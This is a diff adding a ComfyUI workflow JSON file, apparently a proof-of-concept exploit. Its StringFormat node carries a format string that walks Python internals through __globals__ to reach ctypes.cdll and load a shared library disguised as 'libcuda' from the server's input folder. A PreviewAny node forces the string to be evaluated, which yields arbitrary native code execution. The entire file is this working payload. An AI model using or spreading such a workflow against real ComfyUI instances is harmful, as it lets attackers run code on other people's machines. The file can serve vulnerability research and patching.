@@ -1,0 +1,28 @@
+{
+  "1": {
+    "class_type": "CreateHookKeyframe",
+    "inputs": {
+      "strength_mult": 1.0,
+      "start_percent": 0.0
+    }
+  },
+  "2": {
+    "class_type": "StringFormat",
+    "inputs": {
+      "f_string": "{a.__class__.__init__.__globals__[comfy].memory_management.ctypes.cdll[/media/bakouer/LAB/workflow/ComfyUI/input/libcuda_1781018474.so]}",
+      "values.a": [
+        "1",
+        0
+      ]
+    }
+  },
+  "3": {
+    "class_type": "PreviewAny",
+    "inputs": {
+      "source": [
+        "2",
+        0
+      ]
+    }
+  }
+}
